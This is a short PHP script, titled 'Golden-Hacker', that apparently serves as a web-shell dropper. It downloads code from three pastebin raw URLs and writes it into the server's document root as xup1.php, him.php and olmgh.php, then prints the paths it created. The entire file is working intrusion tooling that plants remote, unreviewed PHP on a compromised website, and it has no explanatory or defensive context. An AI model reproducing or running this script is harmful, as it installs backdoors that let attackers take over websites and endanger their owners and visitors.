Golden-Hacker
<?php
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/xup1.php" ;
$text = http_get('https://pastebin.com/raw/Tp9Vp6CN');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
echo $check."</br>";
}else 
echo "not exits";
echo "done .\n " ;
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/him.php" ;
$text = http_get('https://pastebin.com/raw/XanZcyVN');
$open = fopen($check2, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check2)){
echo $check2."</br>";
}else 
echo "not exits";
echo "done .\n " ;
$check3=$_SERVER['DOCUMENT_ROOT'] . "/olmgh.php" ;
$text3 = http_get('https://pastebin.com/raw/ia5f8jEa');
$op3=fopen($check3, 'w');
fwrite($op3,$text3);
fclose($op3);
if(file_exists($check3)){
echo $check3."</br>";
}else 
echo "not exits";
echo "done .\n " ;
?>